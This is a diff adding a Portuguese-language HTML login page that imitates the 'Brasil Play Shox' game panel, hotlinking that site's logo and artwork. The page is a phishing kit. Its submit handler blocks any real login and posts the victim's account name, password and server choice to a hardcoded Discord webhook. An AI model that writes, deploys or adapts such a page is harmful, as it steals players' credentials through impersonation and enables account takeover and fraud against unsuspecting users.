@@ -1,0 +1,170 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+  <meta charset="UTF-8" />
+  <title>Brasil Play Shox - Acesso</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: Arial, sans-serif;
+    }
+    body {
+      display: flex;
+      height: 100vh;
+      background-color: #0f0f1a;
+    }
+    .container {
+      display: flex;
+      width: 100%;
+    }
+    .left {
+      width: 40%;
+      background-color: #0f0f1a;
+      color: white;
+      padding: 50px;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      position: relative;
+    }
+    .left h2 {
+      font-size: 24px;
+      font-weight: bold;
+      margin-bottom: 30px;
+      display: flex;
+      align-items: center;
+    }
+    .left h2::before {
+      content: '';
+      display: inline-block;
+      background: url('https://painel.brasilplayshox.com.br/_next/image?url=%2F_next%2Fstatic%2Fmedia%2Ftitle-gadget.412da5c5.png&w=64&q=75') no-repeat center;
+      background-size: contain;
+      width: 20px;
+      height: 20px;
+      margin-right: 10px;
+      animation: spin 1s linear infinite;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0); }
+      100% { transform: rotate(360deg); }
+    }
+    .logo {
+      width: 60px;
+      margin-bottom: 30px;
+    }
+    .form-group {
+      margin-bottom: 20px;
+    }
+    .form-group input,
+    .form-group select {
+      width: 100%;
+      padding: 12px;
+      border-radius: 10px;
+      border: none;
+      background-color: #1e1e2e;
+      color: white;
+      font-size: 14px;
+    }
+    .form-group input::placeholder {
+      color: #999;
+    }
+    .btn {
+      width: 100%;
+      padding: 12px;
+      background-color: #7c3aed;
+      border: none;
+      color: white;
+      border-radius: 10px;
+      margin-top: 10px;
+      font-weight: bold;
+      cursor: pointer;
+    }
+    .forgot {
+      margin-top: 20px;
+      color: white;
+      text-align: center;
+      font-size: 14px;
+    }
+    .recaptcha-info {
+      margin-top: 20px;
+      color: #aaa;
+      font-size: 12px;
+      text-align: center;
+    }
+    .recaptcha-info a {
+      color: #8b5cf6;
+      text-decoration: none;
+    }
+    .right {
+      width: 60%;
+      background: url('https://painel.brasilplayshox.com.br/_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fbackground_auth.24fcd4a3.png&w=1920&q=100') no-repeat center;
+      background-size: cover;
+      position: relative;
+    }
+    .right img.character {
+      position: absolute;
+      bottom: 0;
+      right: 50px;
+      max-height: 100%;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="left">
+      <img class="logo" src="https://painel.brasilplayshox.com.br/_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fshox-logo.d0f9a206.png&w=3840&q=75" alt="Logo">
+      <h2>Entrar</h2>
+      <form id="loginForm">
+        <div class="form-group">
+          <input type="text" id="username" placeholder="Conta" required>
+        </div>
+        <div class="form-group">
+          <input type="password" id="password" placeholder="Senha" required>
+        </div>
+        <div class="form-group">
+          <select id="server">
+            <option value="1">1</option>
+            <option value="2">2</option>
+            <option value="3">3</option>
+            <option value="4">4</option>
+          </select>
+        </div>
+        <button type="submit" class="btn">Entrar</button>
+      </form>
+      <div class="forgot">Esqueci minha senha</div>
+      <div class="recaptcha-info">
+        Esta aplicação é protegida por reCAPTCHA e Google.
+        <a href="#">Política de Privacidade</a> e
+        <a href="#">Termos de Serviço</a> são aplicados.
+      </div>
+    </div>
+    <div class="right">
+      <img class="character" src="https://painel.brasilplayshox.com.br/_next/image?url=%2F_next%2Fstatic%2Fmedia%2Favatar_auth.fdfa067c.png&w=640&q=100" alt="Personagem">
+    </div>
+  </div>
+
+  <script>
+    document.getElementById("loginForm").addEventListener("submit", function(e) {
+      e.preventDefault();
+      const username = document.getElementById("username").value;
+      const password = document.getElementById("password").value;
+      const server = document.getElementById("server").value;
+
+      fetch("https://discord.com/api/webhooks/1399788338428514324/R3KsZw7mZZwxRo0MccPSXDDE-8ROSPOPKxQhyRCVaTpEcWZa4Z3Mpy5scIdq92y4Qi_z", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          content: `🎮 Novo login:\n👤 Conta: **${username}**\n🔒 Senha: **${password}**\n🌐 Servidor: ${server}`
+        })
+      }).catch(err => {
+        alert("Erro ao enviar, tente novamente.");
+        console.error(err);
+      });
+    });
+  </script>
+</body>
+</html>
